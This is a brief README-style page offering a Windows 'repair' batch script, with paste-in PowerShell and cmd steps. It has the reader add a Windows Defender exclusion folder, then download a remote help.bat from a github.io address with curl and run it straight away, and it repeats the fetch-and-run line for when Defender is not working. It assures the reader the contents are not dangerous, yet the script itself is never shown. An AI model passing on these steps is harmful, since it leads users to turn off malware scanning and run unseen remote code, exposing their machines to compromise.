This is a batch file for repair.

The contents are not dangerous.
However, since I couldn't think of a way to complete it with commands alone, I am creating an exclusion folder.


powershell
```
mkdir C:check
Add-MpPreference -ExclusionPath C:check
```
cmd
```
cd C:check
curl -s https://yuyu1815.github.io/win-repair/help.bat -o script.bat && script.bat
```
del
```
rmdir /s C:check
```


When Windows Defender is not working
```
curl -s https://yuyu1815.github.io/win-repair/help.bat -o script.bat && script.bat
```
